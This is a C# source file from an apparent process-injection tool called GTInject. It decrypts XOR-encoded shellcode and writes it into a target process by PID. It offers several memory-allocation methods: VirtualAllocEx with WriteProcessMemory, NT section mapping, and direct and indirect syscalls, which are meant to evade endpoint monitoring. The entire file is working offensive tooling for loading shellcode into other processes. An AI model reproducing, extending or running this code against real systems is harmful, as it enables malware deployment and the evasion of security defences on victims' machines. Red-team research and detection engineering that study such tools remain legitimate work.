using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using GTInject.SysCalls;

namespace GTInject.memoryOptions
{
    internal class memory
    {
        public static (IntPtr, Process) SelectMemOption(int memoption, int execoption, string xorkey, string binsrctype, string binsrcpath, int pid, int tid)
        {
            switch (memoption)
            {
                case 100:
                    return memopt100(binsrctype, binsrcpath, xorkey, pid);
                case 200:
                    return memopt200(binsrctype, binsrcpath, xorkey, pid);
                case 201:
                    return memopt201(binsrctype, binsrcpath, xorkey, pid);
                case 300:
                    return memopt300(binsrctype, binsrcpath, xorkey, pid);
                case 301:
                    return memopt301(binsrctype, binsrcpath, xorkey, pid);
                case 302:
                    return memopt302(binsrctype, binsrcpath, xorkey, pid);
                case 303:
                    return memopt303(binsrctype, binsrcpath, xorkey, pid);
                default:
                    Console.WriteLine("[-] Not a valid memory allocation option integer");
                    return (IntPtr.Zero, null);
            }

        }
        private static (IntPtr, Process) memopt100(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 100 == VirtualAllocEx && WriteProcessMemory (WINAPI)
            /////////////////////////////////////

            Console.WriteLine("     Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");

            // Got what we need to start injection
            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
                
            Process pid = Process.GetProcessById(ProcID);
            Console.WriteLine("     have pid " + pid.Id + " " + pid);
            IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
            Console.WriteLine("     allocated mem at address " + vMemAddr);
            IntPtr outsize;
            var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically

            if (writeResp)
            {
                Console.WriteLine("[+] Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs: " + writeResp + "\n");
                return (vMemAddr, pid);
            }
            else
            {
                Console.WriteLine("[-] Failed to write with VirtAllocEx and WriteProcMem WINAPIs\n");
                return (IntPtr.Zero, null);
            }
        }


        private static (IntPtr, Process) memopt200(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 200 == NtCreateSection, NtMapViewOfSection, RtlCopyMemory (NTAPI)
            /////////////////////////////////////
            // https://github.com/tasox/CSharp_Process_Injection/blob/main/04.%20Process_Injection_template_(Low%20Level%20Windows%20API)%20-%20Modify%20Permissions/Program.cs 
            Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            int len = plainBytes.Length;
            uint bufferLength = (uint)len;
            IntPtr sectionHandler = new IntPtr();
            Console.WriteLine("     section perms value : " + (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE));
            long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
            Console.WriteLine("     createsection long resp : " + createSection);
            Console.WriteLine("     section handler : " + sectionHandler);
            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = plainBytes.Length;
            ulong offsetSectionLocal = new ulong();

            Process localProc = Process.GetCurrentProcess();
            long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     local section mapped : long resp : " + mapSectionLocal);
            Console.WriteLine("     local base address " + localBaseAddress);

            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = plainBytes.Length;
            ulong offsetSectionRemote = new ulong();

            Process remoteProc = Process.GetProcessById(ProcID);

            long mapSectionRemote = NtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
            Console.WriteLine("     mapSectionRemote resp : " + mapSectionRemote);
            Console.WriteLine("     remoteBaseAddress " + remoteBaseAddress);

            //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
            Console.WriteLine("     created unmanaged ptr " + unmanagedPointer);
            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
            Console.WriteLine("     marshal copied to unmgd ptr ");
/*            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
            Console.WriteLine( "    RtlCopyMemory execd");
            Marshal.FreeHGlobal(unmanagedPointer);*/

            try
            {
                RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
                Console.WriteLine("     RtlCopyMemory execd");
                Marshal.FreeHGlobal(unmanagedPointer);
                Console.WriteLine("[+] Wrote to Mem using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                return (remoteBaseAddress, remoteProc);
            }
            catch {
                Console.WriteLine("[-] Failed to write using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                Marshal.FreeHGlobal(unmanagedPointer);
                return (IntPtr.Zero, null);
            }
        }


        private static (IntPtr, Process) memopt201(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            /////////////////////////////////////
            // OPTION 201 == NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
            /////////////////////////////////////
            /// https://github.com/tasox/CSharp_Process_Injection 
            Console.WriteLine("     Allocate memory using NTAPIs - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            Process remoteProc = Process.GetProcessById(ProcID);
            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)plainBytes.Length;

            // Memory Allocation
            IntPtr NtAllocResult = NtAllocateVirtualMemory(remoteProc.Handle, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     NTAlloc resp : " + NtAllocResult);
            Console.WriteLine("     NTAlloc address " + baseAddress);

            int NtWriteProcess = NtWriteVirtualMemory(remoteProc.Handle, baseAddress, plainBytes, (uint)plainBytes.Length, out uint wr);
            Console.WriteLine("     NtWrite resp : " + NtWriteProcess);
            Console.WriteLine("     written " + wr);
            uint flOld = 0;
            uint sectionSize = (uint)plainBytes.Length;
            uint NtVirtProtResp = NtProtectVirtualMemory(remoteProc.Handle, ref baseAddress, ref sectionSize, (uint)(MemoryProtection.ExecuteRead), ref flOld);
            Console.WriteLine("     NtProtect resp : " + NtVirtProtResp);
            if (baseAddress != IntPtr.Zero)
            {
                Console.WriteLine("[+] Wrote to Mem using NTAPIs - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory\n");
            }
            return (baseAddress, remoteProc);
        }

        private static (IntPtr, Process) memopt300(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            /////////////////////////////////////
            // OPTION 300 == Direct Syscalls NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
            /////////////////////////////////////

            Console.WriteLine("     Allocate memory using Direct Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
            Process remoteProc = Process.GetProcessById(ProcID);
            // set up the syscall for NtOpenProcess
            WinNative.CLIENT_ID cID = new WinNative.CLIENT_ID();
            cID.UniqueProcess = (IntPtr)(UInt32)ProcID;
            WinNative.OBJECT_ATTRIBUTES oAttr = new WinNative.OBJECT_ATTRIBUTES();

            IntPtr hProcess = IntPtr.Zero; var status = Syscalls.SysclNtOpenProcess(ref hProcess, 0x001F0FFF, ref oAttr, ref cID);

            // set up the syscall for NtAllocateVirtualMemory
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)(plainBytes.Length);
            status = Syscalls.SysclNtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     Direct Syscall to Allocate " + status);
            // set up the syscall for NtWriteVirtualMemory
            var buffer = Marshal.AllocHGlobal(plainBytes.Length);
            Marshal.Copy(plainBytes, 0, buffer, plainBytes.Length);
            uint bytesWritten = 0;
            status = Syscalls.SysclNtWriteVirtualMemory(hProcess, baseAddress, buffer, (uint)plainBytes.Length, ref bytesWritten);
            Console.WriteLine("     Direct Syscall to Write " + status);
            Marshal.FreeHGlobal(buffer);

            // set up the syscall for NtProtectVirtualMemory
            uint oldProtect = 0;
            status = Syscalls.SysclNtProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, (uint)MemoryProtection.ExecuteRead, ref oldProtect);
            Console.WriteLine("     Direct Syscall to vProt " + status);
            if (baseAddress != IntPtr.Zero)
            {
                Console.WriteLine("[+] Wrote to Mem using Direct Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory\n");
            }
            return (baseAddress, remoteProc);
        }

        private static (IntPtr, Process) memopt301(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            /////////////////////////////////////
            // OPTION 301 == Direct Syscalls NtCreateSection, NtMapViewOfSection, RtlCopyMemory
            /////////////////////////////////////
            Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            int len = plainBytes.Length;
            uint bufferLength = (uint)len;
            IntPtr sectionHandler = new IntPtr();
            var status = Syscalls.SysclNtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
            Console.WriteLine("     Direct Syscall to NtCreateSection NTSTATUS : " + status);

            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = plainBytes.Length;
            ulong offsetSectionLocal = new ulong();

            Process localProc = Process.GetCurrentProcess();
            status = Syscalls.SysclNtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     Direct Syscall to NtMapViewOfSection local NTSTATUS : " + status);
            Console.WriteLine("     local base address " + localBaseAddress);

            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = plainBytes.Length;
            ulong offsetSectionRemote = new ulong();

            Process remoteProc = Process.GetProcessById(ProcID);

            status = Syscalls.SysclNtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
            Console.WriteLine("     Direct Syscall to NtMapViewOfSection remote NTSTATUS : " + status);

            //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
            Console.WriteLine("     created unmanaged ptr " + unmanagedPointer);
            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
            Console.WriteLine("     marshal copied to unmgd ptr ");
            /*            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
                        Console.WriteLine( "    RtlCopyMemory execd");
                        Marshal.FreeHGlobal(unmanagedPointer);*/

            try
            {
                RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
                Console.WriteLine("     RtlCopyMemory execd");
                Marshal.FreeHGlobal(unmanagedPointer);
                Console.WriteLine("[+] Wrote to Mem using Direct Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                return (remoteBaseAddress, remoteProc);
            }
            catch
            {
                Console.WriteLine("[-] Failed to write using Direct Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                Marshal.FreeHGlobal(unmanagedPointer);
                return (IntPtr.Zero, null);
            }

        }


        private static (IntPtr, Process) memopt302(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            /////////////////////////////////////
            // OPTION 302 == Indirect Syscalls NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
            /////////////////////////////////////

            Console.WriteLine("     Allocate memory using Indirect Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
            Process remoteProc = Process.GetProcessById(ProcID);

            // set up the syscall for NtOpenProcess
            WinNative.CLIENT_ID cID = new WinNative.CLIENT_ID();
            cID.UniqueProcess = (IntPtr)(UInt32)ProcID;
            WinNative.OBJECT_ATTRIBUTES oAttr = new WinNative.OBJECT_ATTRIBUTES();

            IntPtr hProcess = IntPtr.Zero; 
            var status = Syscalls.IndirectSysclNtOpenProcess(ref hProcess, 0x001F0FFF, ref oAttr, ref cID);

            // set up the syscall for NtAllocateVirtualMemory
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)(plainBytes.Length);
            status = Syscalls.IndirectSysclNtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     Indirect Syscall to Allocate " + status);
            
            // set up the syscall for NtWriteVirtualMemory
            var buffer = Marshal.AllocHGlobal(plainBytes.Length);
            Marshal.Copy(plainBytes, 0, buffer, plainBytes.Length);
            uint bytesWritten = 0;
            status = Syscalls.IndirectSysclNtWriteVirtualMemory(hProcess, baseAddress, buffer, (uint)plainBytes.Length, ref bytesWritten);
            Console.WriteLine("     Indirect Syscall to Write " + status);
            Marshal.FreeHGlobal(buffer);

            // set up the syscall for NtProtectVirtualMemory
            uint oldProtect = 0;
            status = Syscalls.IndirectSysclNtProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, (uint)MemoryProtection.ExecuteRead, ref oldProtect);
            Console.WriteLine("     Indirect Syscall to vProt " + status);
            if (baseAddress != IntPtr.Zero)
            {
                Console.WriteLine("[+] Wrote to Mem using Indirect Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory\n");
            }
            return (baseAddress, remoteProc);
        }


        private static (IntPtr, Process) memopt303(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            /////////////////////////////////////
            // OPTION 303 == Indirect Syscalls NtCreateSection, NtMapViewOfSection, RtlCopyMemory
            /////////////////////////////////////
            Console.WriteLine("     Allocate memory using Indirect Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");

            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);

            int len = plainBytes.Length;
            uint bufferLength = (uint)len;
            IntPtr sectionHandler = new IntPtr();
            var status = Syscalls.IndirectSysclNtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
            Console.WriteLine("     Indirect Syscall to NtCreateSection NTSTATUS : " + status);

            // Map the new section for the LOCAL process.
            IntPtr localBaseAddress = new IntPtr();
            int sizeLocal = plainBytes.Length;
            ulong offsetSectionLocal = new ulong();

            Process localProc = Process.GetCurrentProcess();
            status = Syscalls.IndirectSysclNtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
            Console.WriteLine("     Indirect Syscall to NtMapViewOfSection local NTSTATUS : " + status);
            Console.WriteLine("     local base address " + localBaseAddress);

            // Map the new section for the REMOTE process.
            IntPtr remoteBaseAddress = new IntPtr();
            int sizeRemote = plainBytes.Length;
            ulong offsetSectionRemote = new ulong();

            Process remoteProc = Process.GetProcessById(ProcID);

            status = Syscalls.IndirectSysclNtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
            Console.WriteLine("     Indirect Syscall to NtMapViewOfSection remote NTSTATUS : " + status);

            //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
            Console.WriteLine("     created unmanaged ptr " + unmanagedPointer);
            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
            Console.WriteLine("     marshal copied to unmgd ptr ");
            /*            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
                        Console.WriteLine( "    RtlCopyMemory execd");
                        Marshal.FreeHGlobal(unmanagedPointer);*/

            try
            {
                RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
                Console.WriteLine("     RtlCopyMemory execd");
                Marshal.FreeHGlobal(unmanagedPointer);
                Console.WriteLine("[+] Wrote to Mem using Indirect Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                return (remoteBaseAddress, remoteProc);
            }
            catch
            {
                Console.WriteLine("[-] Failed to write using Indirect Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory\n");
                Marshal.FreeHGlobal(unmanagedPointer);
                return (IntPtr.Zero, null);
            }

        }




        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////



        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////

        //https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
        private static readonly uint SEC_COMMIT = 0x8000000;

        [Flags]
        public enum NtSectionPerms
        {
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_EXECUTE = 0x0008
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum NTSTATUS : uint
        {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }

        [Flags] // Don't need this yet, but saw it and decided to borrow it. 
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlCopyMemory(IntPtr dest, IntPtr src, uint length);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint OldAccessProtection);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

    }
}
